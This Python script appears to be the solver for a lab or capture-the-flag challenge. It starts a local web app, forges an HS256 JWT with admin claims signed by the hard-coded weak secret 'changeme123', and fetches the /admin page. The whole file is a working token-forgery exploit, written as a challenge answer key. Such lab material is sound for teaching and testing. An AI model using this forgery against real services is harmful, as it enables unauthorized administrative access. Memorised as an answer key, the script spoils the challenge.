#!/usr/bin/env python3
from __future__ import annotations

import base64, hashlib, hmac, json, os, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18085)
    try:
        header = {"alg":"HS256","typ":"JWT"}
        payload = {"user":"admin","role":"admin"}
        body = ".".join([b64url(json.dumps(header).encode()), b64url(json.dumps(payload).encode())])
        sig = b64url(hmac.new(b"changeme123", body.encode(), hashlib.sha256).digest())
        token = body + "." + sig
        body = urllib.request.urlopen(f"http://127.0.0.1:18085/admin?token={urllib.parse.quote(token)}").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
